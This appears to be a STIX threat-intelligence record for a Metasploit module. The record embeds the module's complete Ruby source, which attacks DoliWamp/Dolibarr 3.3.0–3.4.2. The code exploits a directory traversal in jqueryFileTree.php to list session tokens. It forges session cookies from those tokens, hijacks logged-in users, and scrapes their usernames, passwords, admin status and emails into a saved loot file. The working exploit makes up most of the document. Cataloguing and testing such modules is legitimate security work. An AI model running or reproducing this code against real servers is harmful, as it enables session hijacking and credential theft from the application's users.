{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--55fcefd4-6132-4ed3-8049-29fda0dfd1d5",
    "created": "2024-08-14T16:32:28.707634Z",
    "modified": "2024-08-14T16:32:28.707638Z",
    "name": "\"DoliWamp jqueryFileTree.php Traversal Gather Credentials\"",
    "description": " This module will extract user credentials from DoliWamp - a WAMP packaged installer distribution for Dolibarr ERP on Windows - versions 3.3.0 to 3.4.2 by hijacking a user's session. DoliWamp stores session tokens in filenames in the 'tmp' directory. A directory traversal vulnerability in 'jqueryFileTree.php' allows unauthenticated users to retrieve session tokens by listing the contents of this directory. Note: All tokens expire after 30 minutes of inactivity by default.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/doliwamp_traversal_creds.rb",
            "external_id": "doliwamp_traversal_creds.rb"
        },
        {
            "source_name": "reference",
            "url": "https://doliforge.org/tracker/?func=detail&aid=1212&group_id=144"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/Dolibarr/dolibarr/commit/8642e2027c840752c4357c4676af32fe342dc0cb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(\n      info,\n      'Name'           => \"DoliWamp 'jqueryFileTree.php' Traversal Gather Credentials\",\n      'Description'    => %q{\n          This module will extract user credentials from DoliWamp - a WAMP\n        packaged installer distribution for Dolibarr ERP on Windows - versions\n        3.3.0 to 3.4.2 by hijacking a user's session. DoliWamp stores session\n        tokens in filenames in the 'tmp' directory. A directory traversal\n        vulnerability in 'jqueryFileTree.php' allows unauthenticated users\n        to retrieve session tokens by listing the contents of this directory.\n        Note: All tokens expire after 30 minutes of inactivity by default.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => 'bcoles',\n      'References'     =>\n        [\n          ['URL', 'https://doliforge.org/tracker/?func=detail&aid=1212&group_id=144'],\n          ['URL', 'https://github.com/Dolibarr/dolibarr/commit/8642e2027c840752c4357c4676af32fe342dc0cb']\n        ],\n      'DisclosureDate' => '2014-01-12'))\n    register_options(\n      [\n        OptString.new('TARGETURI',      [true, 'The path to Dolibarr', '/dolibarr/']),\n        OptString.new('TRAVERSAL_PATH', [true, 'The traversal path to the application tmp directory', '../../../../../../../../tmp/'])\n      ])\n  end\n\n  #\n  # Find session tokens\n  #\n  def get_session_tokens\n    tokens = nil\n    print_status(\"Finding session tokens...\")\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => normalize_uri(\n        target_uri.path,\n        'includes/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.php'),\n      'cookie'    => @cookie,\n      'vars_post' => { 'dir' => datastore['TRAVERSAL_PATH'] }\n    })\n    if !res\n      print_error(\"Connection failed\")\n    elsif res.code == 404\n      print_error(\"Could not find 'jqueryFileTree.php'\")\n    elsif res.code == 200 and res.body =~ />sess_([a-z0-9]+)</\n      tokens = res.body.scan(/>sess_([a-z0-9]+)</)\n      num_tokens = tokens.length.to_s.gsub(/(\\d)(?=(\\d\\d\\d)+(?!\\d))/) { \"#{$1},\" }\n      print_good(\"Found #{num_tokens} session tokens\")\n    else\n      print_error(\"Could not find any session tokens\")\n    end\n    return tokens\n  end\n\n  #\n  # Get user's credentials\n  #\n  def get_user_info(user_id)\n    vprint_status(\"Retrieving user's credentials\")\n    res = send_request_cgi({\n      'method'    => 'GET',\n      'uri'       => normalize_uri(target_uri.path, 'user/fiche.php'),\n      'cookie'    => @cookie,\n      'vars_get'  => Hash[{\n        'action'    => 'edit',\n        'id'        => \"#{user_id}\"\n      }.to_a.shuffle]\n    })\n    if !res\n      print_error(\"Connection failed\")\n    elsif res.body =~ /User card/\n      record = [\n        res.body.scan(/name=\"login\" value=\"([^\"]+)\"/             ).flatten.first,\n        res.body.scan(/name=\"password\" value=\"([^\"]+)\"/          ).flatten.first,\n        res.body.scan(/name=\"superadmin\" value=\"\\d\">(Yes|No)/    ).flatten.first,\n        res.body.scan(/name=\"email\" class=\"flat\" value=\"([^\"]+)\"/).flatten.first\n      ]\n      unless record.empty?\n        print_good(\"Found credentials (#{record[0]}:#{record[1]})\")\n        return record\n      end\n    else\n      print_warning(\"Could not retrieve user credentials\")\n    end\n  end\n\n  #\n  # Verify if session cookie is valid and return user's ID\n  #\n  def get_user_id\n    res = send_request_cgi({\n      'uri'       => normalize_uri(target_uri.path, 'user/fiche.php'),\n      'cookie'    => @cookie\n    })\n    if !res\n      print_error(\"Connection failed\")\n    elsif res.body =~ /<div class=\"login\"><a href=\"[^\"]*\\/user\\/fiche\\.php\\?id=(\\d+)\">/\n      user_id = \"#{$1}\"\n      vprint_good(\"Hijacked session for user with ID '#{user_id}'\")\n      return user_id\n    else\n      vprint_status(\"Could not hijack session. Session is invalid.\")\n    end\n  end\n\n  #\n  # Construct cookie using token\n  #\n  def create_cookie(token)\n    res = send_request_cgi({\n      'uri'       => normalize_uri(target_uri.path, 'user/fiche.php'),\n      'cookie'    => \"DOLSESSID_#{Rex::Text.rand_text_alphanumeric(10)}=#{token}\"\n    })\n    if !res\n      print_error(\"Connection failed\")\n    elsif res.code == 200 and res.get_cookies =~ /DOLSESSID_([a-f0-9]{32})=/\n      return \"DOLSESSID_#{$1}=#{token}\"\n    else\n      print_warning(\"Could not create session cookie\")\n    end\n  end\n\n  #\n  # Show progress percentage\n  # Stolen from modules/auxiliary/scanner/ftp/titanftp_xcrc_traversal.rb\n  #\n  def progress(current, total)\n    done    = (current.to_f / total.to_f) * 100\n    percent = \"%3.2f%%\" % done.to_f\n    vprint_status(\"Trying to hijack a session - \" +\n      \"%7s done (%d/%d tokens)\" % [percent, current, total])\n  end\n\n  #\n  # Check for session tokens in 'tmp'\n  #\n  def check\n    get_session_tokens ? Exploit::CheckCode::Vulnerable : Exploit::CheckCode::Safe\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def run\n    return unless tokens = get_session_tokens\n    credentials = []\n    print_status(\"Trying to hijack a session...\")\n    tokens.flatten.each_with_index do |token, index|\n      if @cookie = create_cookie(token) and user_id = get_user_id\n        credentials << get_user_info(user_id)\n      end\n      progress(index + 1, tokens.size)\n    end\n\n    if credentials.empty?\n      print_warning(\"No credentials collected.\")\n      return\n    end\n    cred_table = Rex::Text::Table.new(\n      'Header'  => 'Dolibarr User Credentials',\n      'Indent'  => 1,\n      'Columns' => ['Username', 'Password', 'Admin', 'E-mail']\n    )\n    credentials.each do |record|\n      report_cred(\n        ip: rhost,\n        port: rport,\n        service_name: (ssl ? 'https' : 'http'),\n        user: record[0],\n        password: record[1],\n        proof: @cookie\n      )\n      cred_table << [record[0], record[1], record[2], record[3]]\n    end\n    print_line\n    print_line(\"#{cred_table}\")\n    loot_name     = 'dolibarr.traversal.user.credentials'\n    loot_type     = 'text/csv'\n    loot_filename = 'dolibarr_user_creds.csv'\n    loot_desc     = 'Dolibarr User Credentials'\n    p = store_loot(\n      loot_name,\n      loot_type,\n      rhost,\n      cred_table.to_csv,\n      loot_filename,\n      loot_desc)\n    print_status(\"Credentials saved in: #{p}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-01-12"
}